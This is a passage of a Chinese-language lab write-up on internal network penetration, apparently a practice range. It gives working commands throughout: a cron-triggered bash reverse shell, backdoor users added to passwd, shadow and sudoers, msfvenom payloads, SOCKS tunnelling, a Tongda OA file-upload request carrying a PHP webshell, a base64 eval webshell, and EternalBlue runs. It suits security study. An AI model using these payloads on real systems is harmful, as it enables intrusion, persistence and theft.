+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210100906972.png" alt="image-20221010090651918"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210100907706.png" alt="image-20221010090722654"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /dev</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210100907608.png" alt="image-20221010090759555"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /</span><br><span class="line">mkdir wanan</span><br><span class="line">mount /dev/sda1 /wanan</span><br><span class="line">ls /wanan</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210100913284.png" alt="image-20221010091325230"></p>
+<p>成功挂载</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /wanan/home/ubuntu</span><br><span class="line">ls</span><br><span class="line">cat password</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210100929457.png" alt="image-20221010092936397"></p>
+<h3 id="密码登录"><a href="#密码登录" class="headerlink" title="密码登录"></a>密码登录</h3><p>成功获得ubuntu的密码</p>
+<p>我们尝试从 52.10 直接ssh登录 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh ubuntu@192.168.52.20</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102131408.png" alt="image-20221010213151310"></p>
+<h3 id="写公钥登录"><a href="#写公钥登录" class="headerlink" title="写公钥登录"></a>写公钥登录</h3><p>另一种方式 我们写入公钥去ssh登录</p>
+<p>52.10 生成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102130908.png" alt="image-20221010213013817"></p>
+<p>web1 开启http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102137261.png" alt="image-20221010213738208"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -O http://192.168.52.10:8000/id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102137503.png" alt="image-20221010213756447"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv id_rsa.pub /wanan/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">cat /wanan/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102149636.png" alt="image-20221010213934773"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102150647.png" alt="image-20221010215049564"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102151105.png" alt="image-20221010215122014"></p>
+<h3 id="添加新用户登录"><a href="#添加新用户登录" class="headerlink" title="添加新用户登录"></a>添加新用户登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd -s /bin/bash wanan</span><br><span class="line">passwd wanan</span><br><span class="line">tail /etc/passwd</span><br><span class="line">tail /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102210540.png" alt="image-20221010221029443"></p>
+<p>注意这里要用单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;wanan:x:1002:1002::/home/wanan:/bin/bash&#x27; &gt;&gt; /wanan/etc/passwd</span><br><span class="line">echo &#x27;wanan:$6$rVZXR53W69hWAS1e$E/Zy2oFomIvpS0fjIOYcgmL63ZOhZ5TjGMnUe7BAmQF2qpde/R5tbzr1UUtgLIEZ5zLaTLKuizyVvs7PIQMNJ0:19275:0:99999:7:::&#x27; &gt;&gt; /wanan/etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102217824.png" alt="image-20221010221720734"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102217296.png" alt="image-20221010221739206"></p>
+<p>这个需要提权</p>
+<h4 id="写sudoers提权"><a href="#写sudoers提权" class="headerlink" title="写sudoers提权"></a>写sudoers提权</h4><p>ubuntu提权知识 ubuntu是用命令行执行命令.在普通用户下的操作很受限,无法变成管理员权限,所以需要在一个文件 &#x2F;etc&#x2F;sudoers 处加入普通用户放行语句,才可以让普通用户在ssh的情况下进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;wanan ALL=(ALL:ALL) ALL&quot;&gt;&gt;  /wanan/etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102226215.png" alt="image-20221010222644153"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102227669.png" alt="image-20221010222704617"></p>
+<h4 id="cve-2021-3493提权"><a href="#cve-2021-3493提权" class="headerlink" title="cve-2021-3493提权"></a>cve-2021-3493提权</h4><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102240202.png" alt="image-20221010224039146"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 4.4.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102242527.png" alt="image-20221010224221451"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102245347.png" alt="image-20221010224557299"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/briskets/CVE-2021-3493.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102245707.png" alt="image-20221010224546631"></p>
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch /wanan/tmp/test.sh</span><br><span class="line">chmod +x /wanan/tmp/test.sh</span><br><span class="line">ls -ll /wanan/tmp/test.sh</span><br><span class="line">echo &#x27;/bin/bash -i &gt;&amp; bash -i &gt;&amp; /dev/tcp/192.168.52.10/6666 0&gt;&amp;1&#x27; &gt;&gt; /wanan/tmp/test.sh</span><br><span class="line">cat /wanan/tmp/test.sh</span><br><span class="line">sed -i &#x27;$a*/2 * * * * root bash /tmp/test.sh&#x27; /wanan/etc/crontab</span><br><span class="line">cat /wanan/etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102237425.png" alt="image-20221010223717354"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102238653.png" alt="image-20221010223820581"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">df</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210100919014.png" alt="image-20221010091954968"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">umount /wanan</span><br><span class="line">移除挂载</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210100923285.png" alt="image-20221010092325242"></p>
+<h2 id="ssh流量转发-52-20"><a href="#ssh流量转发-52-20" class="headerlink" title="ssh流量转发(52.20)"></a>ssh流量转发(52.20)</h2><h3 id="1-128-转发-到-52-20的22端口的流量到kali的2222端口"><a href="#1-128-转发-到-52-20的22端口的流量到kali的2222端口" class="headerlink" title="1.128 转发 到 52.20的22端口的流量到kali的2222端口"></a>1.128 转发 到 52.20的22端口的流量到kali的2222端口</h3><p>新建一个用户</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210111319274.png" alt="image-20221011131933236"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -N -f -L 2222:192.168.52.20:22 wanan@192.168.1.128</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-f 将ssh传输转入后台执行,不占用当前shell</span><br><span class="line">-L 转发本地的2222端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210111320605.png" alt="image-20221011132050558"></p>
+<h3 id="配置socks代理转发"><a href="#配置socks代理转发" class="headerlink" title="配置socks代理转发"></a>配置socks代理转发</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -D 7000 wanan@192.168.1.128</span><br><span class="line">-C 压缩传输</span><br><span class="line">-d 将ssh传输转入后台执行,不占用当前的shell</span><br><span class="line">-N 建立静默连接 建立的但是看不到具体会话</span><br><span class="line">-D 动态转发 (socks代理)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210111845099.png" alt="image-20221011184517028"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210111845582.png" alt="image-20221011184556492"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210111847799.png" alt="image-20221011184743756"></p>
+<h2 id="上线web2-52-20"><a href="#上线web2-52-20" class="headerlink" title="上线web2(52.20)"></a>上线web2(52.20)</h2><p>添加路由</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route add 192.168.52.0 255.255.255.0 1</span><br><span class="line">route print</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151559715.png" alt="image-20221015155927662"></p>
+<p>先设置监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.20</span><br><span class="line">set lport 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210112005897.png" alt="image-20221011200506852"></p>
+<p>生成正向shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp lport=6666 -f elf -o  20.elf</span><br></pre></td></tr></table></figure>
+
+<p>scp直接传马到 52.20</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 2222  20.elf ubuntu@127.0.0.1:/tmp/20.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210112011769.png" alt="image-20221011201134715"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151605682.png" alt="image-20221015160528639"></p>
+<p>成功上线</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210112012241.png" alt="image-20221011201252171"></p>
+<p>这里可以看到还有一个  (93.10)</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210112138358.png" alt="image-20221011213842287"></p>
+<h2 id="ew流量转发"><a href="#ew流量转发" class="headerlink" title="ew流量转发"></a>ew流量转发</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/idlefire/ew.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151647970.png" alt="image-20221015164700912"></p>
+<p>1.129</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151710280.png" alt="image-20221015171055231"></p>
+<p>52.10</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rssocks -d 192.168.1.129 -e 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151712563.png" alt="image-20221015171234516"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151713035.png" alt="image-20221015171341964"></p>
+<p>这里配置完成了 但是还是 ping 不通 52.30 </p>
+<p>但是这里还是ping 不通 其中主要原因是防火墙没有放开 但是这里按照作者的逻辑 不应该防护 52.20 到达 52.30的流量 至少是8080 </p>
+<p>因此我这里选择把公共网络防火墙给关闭</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151823093.png" alt="image-20221015182345967"></p>
+<p>重新测试成功访问到了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151824500.png" alt="image-20221015182424428"></p>
+<p>这里接着探测一下52 段的存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/netbios/nbname </span><br><span class="line">options</span><br><span class="line">set rhosts 192.168.52.1-254</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151831223.png" alt="image-20221015183123163"></p>
+<h2 id="上线pc1-52-30"><a href="#上线pc1-52-30" class="headerlink" title="上线pc1(52.30)"></a>上线pc1(52.30)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">options</span><br><span class="line">set rhosts 192.168.52.30</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151835871.png" alt="image-20221015183548803"></p>
+<p>可以看到有一个8080 端口 这里我们先给burp 配置一下 192.168.1.129 1080 的上层代理</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151841829.png" alt="image-20221015184125562"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151847268.png" alt="image-20221015184711555"></p>
+<p>点击链接发现版本 为oa 11.10 版本</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151847315.png" alt="image-20221015184723038"></p>
+<p>根据文章获得shell</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/szgyunyun/article/details/107104288">https://blog.csdn.net/szgyunyun/article/details/107104288</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">52.30</span>:<span class="number">8080</span></span><br><span class="line">Content-Length: <span class="number">660</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">80.0</span>.<span class="number">3987.132</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=123</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;P&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">123</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/jpeg</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">$command=$_POST[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="comment">$wsh = new COM(&#x27;WScript.shell&#x27;);</span></span><br><span class="line"><span class="comment">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span></span><br><span class="line"><span class="comment">$stdout = $exec-&gt;StdOut();</span></span><br><span class="line"><span class="comment">$stroutput = $stdout-&gt;ReadAll();</span></span><br><span class="line"><span class="comment">echo $stroutput;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151850492.png" alt="image-20221015185017402"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /ispirit/<span class="class"><span class="keyword">interface</span>/<span class="title">gateway</span>.<span class="title">php</span> <span class="title">HTTP</span>/1.1</span></span><br><span class="line"><span class="class"><span class="title">Host</span>: 192.168.52.30:8080</span></span><br><span class="line"><span class="class"><span class="title">Connection</span>: <span class="title">keep</span>-<span class="title">alive</span></span></span><br><span class="line"><span class="class"><span class="title">Accept</span>-<span class="title">Encoding</span>: <span class="title">gzip</span>, <span class="title">deflate</span></span></span><br><span class="line"><span class="class"><span class="title">Accept</span>: */*</span></span><br><span class="line"><span class="class"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">python</span>-<span class="title">requests</span>/2.21.0</span></span><br><span class="line"><span class="class"><span class="title">Content</span>-<span class="title">Length</span>: 72</span></span><br><span class="line"><span class="class"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">application</span>/<span class="title">x</span>-<span class="title">www</span>-<span class="title">form</span>-<span class="title">urlencoded</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">json</span>=</span>&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;/general/../../attach/im/2210/1637758065.jpg&quot;</span>&#125;&amp;cmd=whoami</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151851134.png" alt="image-20221015185119042"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo PD9waHAgQGV2YWwoJF9QT1NUWyd6ZiddKTs/Pg==|base64 -d &gt; zf.php</span><br><span class="line">cat zf.php </span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210162207907.png" alt="image-20221016220742848"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.52.10:8000/zf.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210162209307.png" alt="image-20221016220920203"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210162209609.png" alt="image-20221016220910506"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210162211833.png" alt="image-20221016221116768"></p>
+<p>生成一个正向shell </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lhost=192.168.52.30 lport=7777 -f exe -o 30.exe</span><br></pre></td></tr></table></figure>
+
+<p>scp到 52.10 上面去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp 30.exe  wanan@192.168.1.128:/tmp</span><br></pre></td></tr></table></figure>
+
+<p>在 52.10上面启动一个 http服务</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210161422782.png" alt="image-20221016142244654"></p>
+<p>下载下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.52.10:8000/30.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210162231018.png" alt="image-20221016223102914"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210162231021.png" alt="image-20221016223115918"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210162245502.png" alt="image-20221016224508444"></p>
+<p>设置监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.30</span><br><span class="line">set lport 7777</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210162244896.png" alt="image-20221016224457833"></p>
+<p>这里可以看到还有一张 93.20 的网卡 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210170914688.png" alt="image-20221017091430576"></p>
+<h2 id="ew二级流量转发"><a href="#ew二级流量转发" class="headerlink" title="ew二级流量转发"></a>ew二级流量转发</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210171534454.png" alt="image-20221017153443291"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route add 192.168.93.0 255.255.255.0 3</span><br><span class="line">route print</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210170939386.png" alt="image-20221017093917339"></p>
+<p>1.129</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64  -s lcx_listen -l 6666 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151747729.png" alt="image-20221015174715685"></p>
+<p>52.20</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64  -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151747123.png" alt="image-20221015174701076"></p>
+<p>52.10</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64   -s lcx_slave -d 192.168.1.129 -e 8888 -f 192.168.52.20 -g 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151747829.png" alt="image-20221015174707789"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210151755112.png" alt="image-20221015175534995"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains ping 192.168.93.10   </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210170919331.png" alt="image-20221017091931277"></p>
+<h2 id="上线-93-40"><a href="#上线-93-40" class="headerlink" title="上线(93.40)"></a>上线(93.40)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/netbios/nbname </span><br><span class="line">options</span><br><span class="line">set rhosts 192.168.93.1-254</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210170920092.png" alt="image-20221017092020033"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/syn</span><br><span class="line">options</span><br><span class="line">set rhosts 192.168.93.40</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210170930149.png" alt="image-20221017093028082"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">options </span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.93.40</span><br><span class="line">set lport 4455</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210170934636.png" alt="image-20221017093406557"></p>
+<p>能不能行全靠运气</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210171759475.png" alt="image-20221017175944304"></p>
+<h2 id="上线-93-30"><a href="#上线-93-30" class="headerlink" title="上线(93.30)"></a>上线(93.30)</h2><p>这里在打域控的时候直接就蓝屏了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">options </span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.93.30</span><br><span class="line">set lport 4466</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210171814448.png" alt="image-20221017181406345"></p>
+<p>换一个模块去执行命令试试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin/smb/ms17_010_command</span><br><span class="line">options </span><br><span class="line">set rhosts  192.168.93.30 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210171815660.png" alt="image-20221017181554590"></p>
+<p>传马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lport=7788 -f exe -o 93.exe </span><br></pre></td></tr></table></figure>
+
+<p>把马传到52.20上面去</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210171916972.png" alt="image-20221017191630879"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server  8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210171823110.png" alt="image-20221017182300065"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin/smb/ms17_010_command</span><br><span class="line">options </span><br><span class="line">set command &quot;certutil -urlcache -split -f http://192.168.93.10:8888/93.exe&quot;</span><br><span class="line">set rhosts  192.168.93.30 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210171825794.png" alt="image-20221017182528715"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210171826022.png" alt="image-20221017182608950"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.93.30</span><br><span class="line">set lport 7788</span><br><span class="line">run -j -z</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin/smb/ms17_010_command</span><br><span class="line">options </span><br><span class="line">set command C:\Windows\system32\93.exe</span><br><span class="line">set rhosts  192.168.93.30 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210171830104.png" alt="image-20221017183005048"></p>
+<p>没反应</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/byErichas/p/16617154.html">https://www.cnblogs.com/byErichas/p/16617154.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chen-w/archive/2022/04/26/16194101.html">https://www.cnblogs.com/chen-w/archive/2022/04/26/16194101.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/t/5415.html">https://bbs.zkaq.cn/t/5415.html</a></p>
